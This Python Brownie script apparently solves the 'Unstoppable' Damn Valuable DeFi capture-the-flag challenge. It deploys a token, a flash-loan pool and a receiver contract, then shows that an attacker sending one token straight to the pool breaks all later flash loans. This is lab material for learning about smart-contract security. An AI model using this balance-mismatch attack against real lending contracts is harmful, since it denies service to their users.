from brownie import accounts,DamnValuableToken,UnstoppableLender,ReceiverUnstoppable,exceptions,network,config
import pytest
from web3 import Web3

TOKENS_IN_POOL = Web3.toWei(1000000, "ether")
INITIAL_ATTACKER_BALANCE = Web3.toWei(100, "ether")


def deploy():

    #define account private keys
    (deployer,attacker,someUser) = get_accounts()

    print("Deploy token")
    token = DamnValuableToken.deploy({"from": deployer},publish_source=config["networks"][network.show_active()].get("verify"))
    print("Deploy pool")
    pool = UnstoppableLender.deploy(token.address, {"from": deployer}, publish_source=config["networks"][network.show_active()].get("verify"))
    print("Deploy lender")
    receiveContract = ReceiverUnstoppable.deploy(pool.address, {"from": someUser}, publish_source=config["networks"][network.show_active()].get("verify"))

    printBalances(deployer,attacker,someUser,token,pool,receiveContract)

    #transfer tokens to pool and attacker addresses
    setup_balances(token,pool,deployer,attacker)
    printBalances(deployer,attacker,someUser,token,pool,receiveContract)

    print("Testing flash loan")
    receiveContract.executeFlashLoan(10, {"from": someUser})
    printBalances(deployer,attacker,someUser,token,pool,receiveContract)

    print("Running exploit")
    #exploit
    token.transfer(pool, 1, {"from": attacker})
    printBalances(deployer,attacker,someUser,token,pool,receiveContract)

    print("Testing flash loan after exploit")
    receiveContract.executeFlashLoan(10, {"from": someUser})
    printBalances(deployer,attacker,someUser,token,pool,receiveContract)

def get_accounts():
    if network.show_active() == "development":
        return (accounts[0],accounts[1],accounts[2])
    else:
        return (accounts.add(config["wallets"]["deployer"]),accounts.add(config["wallets"]["attacker"]),accounts.add(config["wallets"]["someUser"]))


def setup_balances(token,pool,deployer,attacker):
    print("Approve transfer of tokens into pool contract")
    token.approve(pool.address, TOKENS_IN_POOL, {"from": deployer})

    print("Transfer tokens into pool contract")
    pool.depositTokens(TOKENS_IN_POOL, {"from": deployer})

    print("Transfer some tokens to attacker")
    token.transfer(attacker, INITIAL_ATTACKER_BALANCE, {"from": deployer})

    #check balance of pool is correct
    assert token.balanceOf(pool.address) == TOKENS_IN_POOL

    #check attacker has received the tokens
    assert token.balanceOf(attacker.address) == INITIAL_ATTACKER_BALANCE

def printBalances(deployer,attacker,someUser,token,pool,receiveContract):
    #print addresses
    print("CONTRACT ADDRESSES:")
    print("Token Address: "+token.address)
    print("DVT Balance: "+str(token.balanceOf(token.address)))
    print("Pool Address: "+pool.address)
    print("DVT Balance (balanceBefore): "+str(token.balanceOf(pool.address)))
    print("DVT Balance (poolBalance): "+str(pool.poolBalance()))
    print("Lender Contract Address: "+receiveContract.address)
    print("DVT Balance: "+str(token.balanceOf(receiveContract.address)))
    
    print("")

    print("USER ADDRESSES:")
    print("Deployer Address: "+str(deployer))
    print("DVT Balance: "+str(token.balanceOf(deployer)))
    print("Attacker Address: "+str(attacker))
    print("DVT Balance: "+str(token.balanceOf(attacker)))
    print("SomeUser Address: "+str(someUser))
    print("DVT Balance: "+str(token.balanceOf(someUser)))

    print("")

def main():
    deploy()